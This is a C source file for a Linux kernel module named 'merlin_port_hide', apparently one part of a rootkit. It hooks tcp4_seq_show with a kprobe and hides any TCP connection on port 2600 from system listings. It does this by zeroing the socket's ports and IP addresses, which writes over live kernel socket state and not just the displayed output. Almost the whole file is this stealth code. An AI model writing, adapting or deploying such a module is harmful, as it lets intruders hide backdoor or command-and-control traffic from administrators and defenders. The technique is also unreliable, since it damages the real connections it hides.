#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/tcp.h>

#ifndef pr_fmt
#define pr_fmt(fmt) "%s: " fmt, __func__
#endif

#define HIDE 2600


/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp_port = {
	.symbol_name = "tcp4_seq_show",
};

static int __kprobes port_handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	void *v;

	struct sock *sk;
	struct inet_sock *inet;

	unsigned short local_port;
	unsigned short remote_port;

	if (!regs){
		return 0;
    }
	pr_info("Registers: ip=%lx, di=%lx, si=%lx, dx=%lx, cx=%lx\n",
		  regs->ip, regs->di, regs->si, regs->dx, regs->cx);

            pr_info("regs->si: %lx\n", regs->si);
            pr_info("regs->di: %lx\n", regs->di); 
            pr_info("regs->dx: %lx\n", regs->dx); 

	// Get the second argument (regs->si)
	v = (void *)regs->si;
	pr_info("Argument v (regs->si): %px\n", v);

	if (v == SEQ_START_TOKEN){
        pr_info("pass");
		return 0;
    }
	// Interpret v as struct sock
	sk = (struct sock *)v;
	pr_info("sock: %px\n", sk);

	if (!sk){
		return 0;
    }
	// Convert sock to inet_sock
	inet = inet_sk(sk);
	pr_info("inet_sock: %px\n", inet);

	if (!inet){
        pr_info("no inet");
		return 0;
    }
	// Take local and remote ports from struct
	local_port = ntohs(inet->inet_sport);
	remote_port = ntohs(inet->inet_dport);
	pr_info("Local port: %u\n", local_port);
	pr_info("Remote port: %u\n", remote_port);

	// Check if the port matches the hidden port
	if (local_port == HIDE || remote_port == HIDE) {
		pr_info("Hiding local port: %u\n", local_port);
		pr_info("Hiding remote port: %u\n", remote_port);

		// Overwrite Ports
		inet->inet_sport = htons(0);
		inet->inet_dport = htons(0);

		pr_info("Overwritten ports - Local: %u, Remote: %u\n",
			  ntohs(inet->inet_sport), ntohs(inet->inet_dport));

		// Overwrite IPs
		inet->inet_rcv_saddr = 0;
		inet->inet_daddr = 0;

		pr_info("IPs overwritten - Local IP: %pI4, Remote IP: %pI4\n",
			  &inet->inet_rcv_saddr, &inet->inet_daddr);
	}

	return 0;
}

static int __init port_hide_init(void)
{
	int ret;
	kp_port.pre_handler = port_handler_pre;

	ret = register_kprobe(&kp_port);
	if (ret < 0) {
		pr_info("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	pr_info("tcp4_seq_show: %px\n", kp_port.addr);
	return 0;
}

static void __exit port_hide_exit(void)
{
	unregister_kprobe(&kp_port);
	pr_info("port_hide exit successfully\n");
}

// Uncomment the following lines to use as standalone module
// module_init(port_hide_init);
// module_exit(port_hide_exit);

MODULE_AUTHOR("Phoenix2006");
MODULE_DESCRIPTION("merlin_port_hide");
MODULE_LICENSE("GPL");